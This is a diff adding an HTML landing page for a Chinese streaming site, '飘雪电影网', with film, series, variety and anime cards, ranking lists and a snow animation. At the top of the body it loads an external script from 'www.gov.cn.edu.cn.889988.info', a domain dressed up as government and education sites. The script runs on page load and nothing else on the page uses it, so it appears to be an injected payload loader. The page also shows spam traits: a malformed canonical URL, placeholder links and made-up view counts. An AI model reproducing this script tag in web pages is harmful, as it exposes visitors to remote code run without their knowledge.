@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>飘雪电影网 - piaoxuedianyingwang-wap | 在线观看高清电影电视剧综艺动漫</title>
+<meta name="keywords" content="飘雪电影网, piaoxuedianyingwang-wap, 在线电影, 高清电影, 电视剧, 综艺, 动漫, 影视网站">
+<meta name="description" content="飘雪电影网（piaoxuedianyingwang-wap）提供最新高清电影、热门电视剧、综艺、动漫在线观看，海量片库每日更新，移动端自适应流畅播放，找好剧就来飘雪电影网。">
+<link rel="canonical" href="https://piaoxuedianyingwang-wap">
+<meta name="mobile-web-app-capable" content="yes">
+<meta name="robots" content="index,follow">
+<meta name="bingbot" content="index,follow,max-image-preview:large">
+<meta name="theme-color" content="#0a0e27">
+<style>
+:root{
+  --bg:#0a0e27; --bg2:#121838; --card:#161d44; --line:#26306a;
+  --txt:#eef1ff; --sub:#a7afd6; --gold:#ffd166; --cy:#4cc9f0; --pink:#ff6fb5;
+}
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html{scroll-behavior:smooth}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei",sans-serif;
+  background:linear-gradient(160deg,#070a1f 0%,#0a0e27 45%,#100f2e 100%);
+  color:var(--txt); line-height:1.7; overflow-x:hidden; min-height:100vh;
+}
+img{max-width:100%;display:block}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+/* ===== 飘雪 ===== */
+#snow{position:fixed;inset:0;pointer-events:none;z-index:0;overflow:hidden}
+.flake{position:absolute;top:-20px;color:#fff;user-select:none;animation:fall linear infinite}
+@keyframes fall{0%{transform:translateY(0) translateX(0) rotate(0);opacity:.9}100%{transform:translateY(110vh) translateX(40px) rotate(360deg);opacity:.1}}
+.wrap{position:relative;z-index:2}
+/* ===== 头部 ===== */
+header{position:sticky;top:0;z-index:50;backdrop-filter:blur(10px);background:rgba(7,10,31,.82);border-bottom:1px solid var(--line)}
+.nav{max-width:1200px;margin:0 auto;padding:12px 16px;display:flex;align-items:center;gap:14px;flex-wrap:wrap}
+.brand{display:flex;align-items:center;gap:10px;flex-shrink:0}
+.logo{width:42px;height:42px;border-radius:12px;background:linear-gradient(135deg,var(--cy),var(--pink));display:grid;place-items:center;font-weight:900;font-size:20px;color:#0a0e27;box-shadow:0 4px 18px rgba(76,201,240,.45)}
+.brand h1{font-size:20px;letter-spacing:.5px;white-space:nowrap}
+.brand h1 small{display:block;font-size:11px;font-weight:400;color:var(--sub);letter-spacing:0}
+.search{flex:1;min-width:160px;position:relative}
+.search input{width:100%;padding:10px 44px 10px 14px;border-radius:22px;border:1px solid var(--line);background:rgba(255,255,255,.06);color:var(--txt);font-size:14px;outline:none}
+.search input:focus{border-color:var(--cy)}
+.search button{position:absolute;right:4px;top:4px;height:32px;padding:0 16px;border:0;border-radius:18px;background:linear-gradient(135deg,var(--cy),var(--pink));color:#0a0e27;font-weight:700;cursor:pointer}
+.menu-btn{display:none;width:40px;height:40px;border:1px solid var(--line);border-radius:10px;background:transparent;color:var(--txt);font-size:20px;cursor:pointer}
+nav.cats{max-width:1200px;margin:0 auto;padding:0 16px 10px;display:flex;gap:8px;flex-wrap:wrap}
+nav.cats a{padding:6px 14px;border-radius:20px;font-size:14px;background:rgba(255,255,255,.05);border:1px solid transparent;transition:.2s}
+nav.cats a:hover{background:rgba(76,201,240,.14);border-color:var(--cy);color:var(--cy)}
+/* ===== 主视觉 ===== */
+.hero{max-width:1200px;margin:26px auto 0;padding:0 16px}
+.hero-in{position:relative;border-radius:24px;overflow:hidden;padding:42px 34px;background:linear-gradient(120deg,rgba(76,201,240,.18),rgba(255,111,181,.14)),radial-gradient(circle at 85% 20%,rgba(255,209,102,.25),transparent 45%);border:1px solid var(--line)}
+.hero-in h2{font-size:30px;line-height:1.3;margin-bottom:12px}
+.hero-in h2 em{font-style:normal;background:linear-gradient(90deg,var(--cy),var(--gold));-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero-in p{color:var(--sub);max-width:560px;font-size:15px}
+.hero-btns{margin-top:20px;display:flex;gap:12px;flex-wrap:wrap}
+.btn{padding:11px 24px;border-radius:22px;font-weight:700;font-size:14px;cursor:pointer;border:0}
+.btn-main{background:linear-gradient(135deg,var(--cy),var(--pink));color:#0a0e27}
+.btn-ghost{background:transparent;border:1px solid var(--line) !important;color:var(--txt)}
+/* ===== 通用区块 ===== */
+section{max-width:1200px;margin:42px auto 0;padding:0 16px}
+.sec-head{display:flex;align-items:end;gap:12px;margin-bottom:18px;flex-wrap:wrap}
+.sec-head h3{font-size:21px;position:relative;padding-left:14px}
+.sec-head h3::before{content:"";position:absolute;left:0;top:4px;bottom:4px;width:5px;border-radius:4px;background:linear-gradient(var(--cy),var(--pink))}
+.sec-head a.more{margin-left:auto;font-size:13px;color:var(--sub);border-bottom:1px dashed var(--line)}
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:16px}
+.card{background:var(--card);border:1px solid var(--line);border-radius:16px;overflow:hidden;transition:.25s}
+.card:hover{transform:translateY(-5px);border-color:var(--cy);box-shadow:0 10px 28px rgba(76,201,240,.18)}
+.thumb{position:relative;aspect-ratio:3/4;overflow:hidden}
+.thumb img{width:100%;height:100%;object-fit:cover;transition:.4s}
+.card:hover .thumb img{transform:scale(1.08)}
+.tag{position:absolute;left:8px;top:8px;background:rgba(10,14,39,.8);color:var(--gold);font-size:11px;padding:2px 8px;border-radius:20px;border:1px solid rgba(255,209,102,.4)}
+.score{position:absolute;right:8px;top:8px;background:rgba(255,111,181,.9);color:#fff;font-size:12px;font-weight:700;padding:2px 8px;border-radius:20px}
+.card .info{padding:10px 12px}
+.card .info b{font-size:14px;display:-webkit-box;-webkit-line-clamp:1;-webkit-box-orient:vertical;overflow:hidden}
+.card .info span{font-size:12px;color:var(--sub);display:block;margin-top:4px}
+/* ===== 榜单 ===== */
+.rank{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:16px}
+.rank-card{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:16px}
+.rank-card h4{font-size:16px;margin-bottom:12px;color:var(--gold)}
+.rank li{display:flex;gap:12px;align-items:center;padding:8px 0;border-bottom:1px dashed rgba(255,255,255,.07)}
+.rank li:last-child{border:0}
+.num{width:24px;height:24px;flex-shrink:0;border-radius:8px;background:rgba(76,201,240,.14);color:var(--cy);font-size:13px;font-weight:800;display:grid;place-items:center}
+.rank li:nth-child(1) .num{background:var(--gold);color:#0a0e27}
+.rank li:nth-child(2) .num,.rank li:nth-child(3) .num{background:var(--pink);color:#fff}
+.rank .tt{flex:1;font-size:14px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.rank .hm{font-size:12px;color:var(--sub)}
+/* ===== 关于 ===== */
+.about{background:var(--card);border:1px solid var(--line);border-radius:20px;padding:26px}
+.about p{color:var(--sub);margin-bottom:12px;font-size:14px}
+.about ul{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:10px;margin-top:6px}
+.about li{padding-left:20px;position:relative;font-size:14px}
+.about li::before{content:"❄";position:absolute;left:0;color:var(--cy)}
+/* ===== 页脚 ===== */
+footer{margin-top:56px;padding:32px 16px 40px;border-top:1px solid var(--line);background:rgba(7,10,31,.7)}
+.foot{max-width:1200px;margin:0 auto;display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:24px}
+.foot h5{font-size:15px;margin-bottom:12px;color:var(--gold)}
+.foot a{display:block;color:var(--sub);font-size:13px;padding:4px 0}
+.foot a:hover{color:var(--cy)}
+.copyright{max-width:1200px;margin:26px auto 0;padding-top:18px;border-top:1px solid var(--line);font-size:12px;color:var(--sub);text-align:center}
+/* ===== 响应式 ===== */
+@media(max-width:720px){
+  .menu-btn{display:block}
+  nav.cats{max-height:0;overflow:hidden;flex-direction:column;padding:0 16px;transition:.3s}
+  nav.cats.open{max-height:420px;padding-bottom:12px}
+  nav.cats a{width:100%;text-align:center}
+  .hero-in{padding:30px 22px}
+  .hero-in h2{font-size:23px}
+  .grid{grid-template-columns:repeat(auto-fill,minmax(120px,1fr));gap:12px}
+  .sec-head h3{font-size:18px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+<div id="snow" aria-hidden="true"></div>
+<div class="wrap">
+  <header>
+    <div class="nav">
+      <div class="brand">
+        <div class="logo" aria-hidden="true">飘</div>
+        <h1>飘雪电影网<small>piaoxuedianyingwang-wap</small></h1>
+      </div>
+      <div class="search">
+        <input type="search" placeholder="搜索电影 / 电视剧 / 演员..." aria-label="搜索">
+        <button type="button">搜索</button>
+      </div>
+      <button class="menu-btn" id="menuBtn" aria-label="菜单">☰</button>
+    </div>
+    <nav class="cats" id="cats">
+      <a href="#home">首页</a>
+      <a href="#movie">电影</a>
+      <a href="#tv">电视剧</a>
+      <a href="#show">综艺</a>
+      <a href="#anime">动漫</a>
+      <a href="#rank">排行榜</a>
+    </nav>
+  </header>
+
+  <div class="hero" id="home">
+    <div class="hero-in">
+      <h2>海量正版高清影视，<em>飘雪电影网</em>陪你过每一个冬天</h2>
+      <p>飘雪电影网 piaoxuedianyingwang-wap 汇聚院线大片、热播剧集、精彩综艺与高分动漫，每日精选更新，手机、平板、电脑自适应播放，随时随地畅享视听。</p>
+      <div class="hero-btns">
+        <a class="btn btn-main" href="#movie">立即观看</a>
+        <a class="btn btn-ghost" href="#rank">查看热榜</a>
+      </div>
+    </div>
+  </div>
+
+  <section id="movie">
+    <div class="sec-head">
+      <h3>电影频道</h3>
+      <a class="more" href="#">查看全部 ›</a>
+    </div>
+    <div class="grid">
+      <a class="card" href="#">
+        <div class="thumb"><span class="tag">动作</span><span class="score">9.2</span><img src="https://picsum.photos/seed/m1/300/400" alt="电影海报：极寒追击"></div>
+        <div class="info"><b>极寒追击</b><span>2026 · 动作 / 犯罪</span></div>
+      </a>
+      <a class="card" href="#">
+        <div class="thumb"><span class="tag">爱情</span><span class="score">8.7</span><img src="https://picsum.photos/seed/m2/300/400" alt="电影海报：雪落无声"></div>
+        <div class="info"><b>雪落无声</b><span>2025 · 爱情 / 剧情</span></div>
+      </a>
+      <a class="card" href="#">
+        <div class="thumb"><span class="tag">科幻</span><span class="score">8.9</span><img src="https://picsum.photos/seed/m3/300/400" alt="电影海报：星海回响"></div>
+        <div class="info"><b>星海回响</b><span>2026 · 科幻 / 冒险</span></div>
+      </a>
+      <a class="card" href="#">
+        <div class="thumb"><span class="tag">喜剧</span><span class="score">8.5</span><img src="https://picsum.photos/seed/m4/300/400" alt="电影海报：欢喜过大年"></div>
+        <div class="info"><b>欢喜过大年</b><span>2026 · 喜剧 / 家庭</span></div>
+      </a>
+      <a class="card" href="#">
+        <div class="thumb"><span class="tag">悬疑</span><span class="score">9.0</span><img src="https://picsum.photos/seed/m5/300/400" alt="电影海报：第七封信"></div>
+        <div class="info"><b>第七封信</b><span>2025 · 悬疑 / 惊悚</span></div>
+      </a>
+      <a class="card" href="#">
+        <div class="thumb"><span class="tag">动画</span><span class="score">8.8</span><img src="https://picsum.photos/seed/m6/300/400" alt="电影海报：雪国少年"></div>
+        <div class="info"><b>雪国少年</b><span>2026 · 动画 / 奇幻</span></div>
+      </a>
+    </div>
+  </section>
+
+  <section id="tv">
+    <div class="sec-head">
+      <h3>电视剧频道</h3>
+      <a class="more" href="#">查看全部 ›</a>
+    </div>
+    <div class="grid">
+      <a class="card" href="#">
+        <div class="thumb"><span class="tag">更新至24集</span><span class="score">9.4</span><img src="https://picsum.photos/seed/t1/300/400" alt="电视剧海报：长风渡雪"></div>
+        <div class="info"><b>长风渡雪</b><span>古装 / 权谋 · 24集全</span></div>
+      </a>
+      <a class="card" href="#">
+        <div class="thumb"><span class="tag">更新至12集</span><span class="score">8.6</span><img src="https://picsum.photos/seed/t2/300/400" alt="电视剧海报：城市边缘"></div>
+        <div class="info"><b>城市边缘</b><span>都市 / 职场 · 12集</span></div>
+      </a>
+      <a class="card" href="#">
+        <div class="thumb"><span class="tag">更新至30集</span><span class="score">8.9</span><img src="https://picsum.photos/seed/t3/300/400" alt="电视剧海报：归途"></div>
+        <div class="info"><b>归途</b><span>军旅 / 剧情 · 30集</span></div>
+      </a>
+      <a class="card" href="#">
+        <div class="thumb"><span class="tag">更新至08集</span><span class="score">8.7</span><img src="https://picsum.photos/seed/t4/300/400" alt="电视剧海报：暗夜追凶"></div>
+        <div class="info"><b>暗夜追凶</b><span>刑侦 / 悬疑 · 8集</span></div>
+      </a>
+      <a class="card" href="#">
+        <div class="thumb"><span class="tag">更新至18集</span><span class="score">8.4</span><img src="https://picsum.photos/seed/t5/300/400" alt="电视剧海报：甜蜜事务所"></div>
+        <div class="info"><b>甜蜜事务所</b><span>爱情 / 轻喜剧 · 18集</span></div>
+      </a>
+      <a class="card" href="#">
+        <div class="thumb"><span class="tag">更新至40集</span><span class="score">9.1</span><img src="https://picsum.photos/seed/t6/300/400" alt="电视剧海报：山河未老"></div>
+        <div class="info"><b>山河未老</b><span>历史 / 正剧 · 40集</span></div>
+      </a>
+    </div>
+  </section>
+
+  <section id="show">
+    <div class="sec-head">
+      <h3>综艺频道</h3>
+      <a class="more" href="#">查看全部 ›</a>
+    </div>
+    <div class="grid">
+      <a class="card" href="#">
+        <div class="thumb"><span class="tag">热播</span><span class="score">8.8</span><img src="https://picsum.photos/seed/s1/300/400" alt="综艺海报：冰雪大挑战"></div>
+        <div class="info"><b>冰雪大挑战</b><span>户外真人秀 · 第5季</span></div>
+      </a>
+      <a class="card" href="#">
+        <div class="thumb"><span class="tag">热播</span><span class="score">8.5</span><img src="https://picsum.photos/seed/s2/300/400" alt="综艺海报：今夜有歌声"></div>
+        <div class="info"><b>今夜有歌声</b><span>音乐竞演 · 第3季</span></div>
+      </a>
+      <a class="card" href="#">
+        <div class="thumb"><span class="tag">热播</span><span class="score">8.3</span><img src="https://picsum.photos/seed/s3/300/400" alt="综艺海报：厨房对决"></div>
+        <div class="info"><b>厨房对决</b><span>美食竞技 · 第8季</span></div>
+      </a>
+      <a class="card" href="#">
+        <div class="thumb"><span class="tag">热播</span><span class="score">8.6</span><img src="https://picsum.photos/seed/s4/300/400" alt="综艺海报：明日喜剧王"></div>
+        <div class="info"><b>明日喜剧王</b><span>喜剧竞演 · 第2季</span></div>
+      </a>
+      <a class="card" href="#">
+        <div class="thumb"><span class="tag">热播</span><span class="score">8.2</span><img src="https://picsum.photos/seed/s5/300/400" alt="综艺海报：行走的风景"></div>
+        <div class="info"><b>行走的风景</b><span>旅行纪实 · 第6季</span></div>
+      </a>
+      <a class="card" href="#">
+        <div class="thumb"><span class="tag">热播</span><span class="score">8.4</span><img src="https://picsum.photos/seed/s6/300/400" alt="综艺海报：天才少年班"></div>
+        <div class="info"><b>天才少年班</b><span>知识竞技 · 第4季</span></div>
+      </a>
+    </div>
+  </section>
+
+  <section id="anime">
+    <div class="sec-head">
+      <h3>动漫频道</h3>
+      <a class="more" href="#">查看全部 ›</a>
+    </div>
+    <div class="grid">
+      <a class="card" href="#">
+        <div class="thumb"><span class="tag">连载</span><span class="score">9.3</span><img src="https://picsum.photos/seed/a1/300/400" alt="动漫海报：雪鹰领主"></div>
+        <div class="info"><b>雪鹰领主</b><span>玄幻 · 更新至52集</span></div>
+      </a>
+      <a class="card" href="#">
+        <div class="thumb"><span class="tag">完结</span><span class="score">9.1</span><img src="https://picsum.photos/seed/a2/300/400" alt="动漫海报：星之彼端"></div>
+        <div class="info"><b>星之彼端</b><span>科幻 · 全24集</span></div>
+      </a>
+      <a class="card" href="#">
+        <div class="thumb"><span class="tag">连载</span><span class="score">8.9</span><img src="https://picsum.photos/seed/a3/300/400" alt="动漫海报：少年与剑"></div>
+        <div class="info"><b>少年与剑</b><span>热血 · 更新至36集</span></div>
+      </a>
+      <a class="card" href="#">
+        <div class="thumb"><span class="tag">连载</span><span class="score">8.7</span><img src="https://picsum.photos/seed/a4/300/400" alt="动漫海报：魔法厨房"></div>
+        <div class="info"><b>魔法厨房</b><span>治愈 · 更新至18集</span></div>
+      </a>
+      <a class="card" href="#">
+        <div class="thumb"><span class="tag">完结</span><span class="score">8.8</span><img src="https://picsum.photos/seed/a5/300/400" alt="动漫海报：深海记事"></div>
+        <div class="info"><b>深海记事</b><span>冒险 · 全12集</span></div>
+      </a>
+      <a class="card" href="#">
+        <div class="thumb"><span class="tag">连载</span><span class="score">9.0</span><img src="https://picsum.photos/seed/a6/300/400" alt="动漫海报：飘雪物语"></div>
+        <div class="info"><b>飘雪物语</b><span>奇幻 · 更新至28集</span></div>
+      </a>
+    </div>
+  </section>
+
+  <section id="rank">
+    <div class="sec-head"><h3>飘雪热播榜</h3><a class="more" href="#">完整榜单 ›</a></div>
+    <div class="rank">
+      <div class="rank-card">
+        <h4>🎬 电影榜</h4>
+        <ul>
+          <li><span class="num">1</span><span class="tt">极寒追击</span><span class="hm">🔥 986万</span></li>
+          <li><span class="num">2</span><span class="tt">星海回响</span><span class="hm">🔥 872万</span></li>
+          <li><span class="num">3</span><span class="tt">第七封信</span><span class="hm">🔥 765万</span></li>
+          <li><span class="num">4</span><span class="tt">雪落无声</span><span class="hm">🔥 643万</span></li>
+          <li><span class="num">5</span><span class="tt">欢喜过大年</span><span class="hm">🔥 521万</span></li>
+        </ul>
+      </div>
+      <div class="rank-card">
+        <h4>📺 剧集榜</h4>
+        <ul>
+          <li><span class="num">1</span><span class="tt">山河未老</span><span class="hm">🔥 1120万</span></li>
+          <li><span class="num">2</span><span class="tt">长风渡雪</span><span class="hm">🔥 948万</span></li>
+          <li><span class="num">3</span><span class="tt">暗夜追凶</span><span class="hm">🔥 813万</span></li>
+          <li><span class="num">4</span><span class="tt">归途</span><span class="hm">🔥 702万</span></li>
+          <li><span class="num">5</span><span class="tt">甜蜜事务所</span><span class="hm">🔥 588万</span></li>
+        </ul>
+      </div>
+      <div class="rank-card">
+        <h4>🏆 综合榜</h4>
+        <ul>
+          <li><span class="num">1</span><span class="tt">飘雪物语</span><span class="hm">🔥 1320万</span></li>
+          <li><span class="num">2</span><span class="tt">冰雪大挑战</span><span class="hm">🔥 1045万</span></li>
+          <li><span class="num">3</span><span class="tt">雪鹰领主</span><span class="hm">🔥 902万</span></li>
+          <li><span class="num">4</span><span class="tt">今夜有歌声</span><span class="hm">🔥 734万</span></li>
+          <li><span class="num">5</span><span class="tt">明日喜剧王</span><span class="hm">🔥 611万</span></li>
+        </ul>
+      </div>
+    </div>
+  </section>
+
+  <section id="about">
+    <div class="about">
+      <h3 style="font-size:20px;margin-bottom:12px;">关于飘雪电影网</h3>
+      <p>飘雪电影网（piaoxuedianyingwang-wap）是一个专注于为用户提供高清影视内容的在线观看平台，网址为 <strong>https://piaoxuedianyingwang-wap</strong>。我们致力于打造干净、流畅、好用的观影体验。</p>
+      <ul>
+        <li>每日精选更新，院线大片与热播剧集同步上线</li>
+        <li>多分类覆盖：电影、电视剧、综艺、动漫一站看全</li>
+        <li>移动端自适应，手机浏览器也能获得原生级体验</li>
+        <li>简洁界面、快速加载，告别繁杂弹窗打扰</li>
+        <li>清晰榜单与专题推荐，帮你快速找到想看的</li>
+        <li>支持关键词搜索，精准定位你喜欢的影视作品</li>
+      </ul>
+    </div>
+  </section>
+
+  <footer>
+    <div class="foot">
+      <div>
+        <h5>飘雪电影网</h5>
+        <a href="https://piaoxuedianyingwang-wap">https://piaoxuedianyingwang-wap</a>
+        <a href="#about">关于本站</a>
+        <a href="#">合作投稿</a>
+      </div>
+      <div>
+        <h5>影视分类</h5>
+        <a href="#movie">电影</a>
+        <a href="#tv">电视剧</a>
+        <a href="#show">综艺</a>
+        <a href="#anime">动漫</a>
+      </div>
+      <div>
+        <h5>热门栏目</h5>
+        <a href="#rank">热播排行榜</a>
+        <a href="#">高分推荐</a>
+        <a href="#">新片速递</a>
+        <a href="#">专题合集</a>
+      </div>
+      <div>
+        <h5>帮助中心</h5>
+        <a href="#">播放问题</a>
+        <a href="#">反馈建议</a>
+        <a href="#">使用协议</a>
+      </div>
+    </div>
+    <div class="copyright">
+      © 2026 飘雪电影网 piaoxuedianyingwang-wap 版权所有 · 网站名称：飘雪电影网 · 网站网址：https://piaoxuedianyingwang-wap<br>
+      本页面所有内页链接均以 # 占位，如需收录请替换为真实可访问链接。
+    </div>
+  </footer>
+</div>
+
+<script>
+// 飘雪动画
+(function(){
+  var box=document.getElementById('snow');
+  var chars=['❄','❅','❆','*'];
+  for(var i=0;i<45;i++){
+    var f=document.createElement('div');
+    f.className='flake';
+    f.textContent=chars[Math.floor(Math.random()*chars.length)];
+    var s=Math.random()*1.2+0.6;
+    f.style.left=Math.random()*100+'%';
+    f.style.fontSize=s+'em';
+    f.style.opacity=Math.random()*0.5+0.3;
+    f.style.animationDuration=(Math.random()*8+6)+'s';
+    f.style.animationDelay=(Math.random()*-14)+'s';
+    box.appendChild(f);
+  }
+})();
+// 移动端菜单
+document.getElementById('menuBtn').addEventListener('click',function(){
+  document.getElementById('cats').classList.toggle('open');
+});
+</script>
+</body>
+</html>
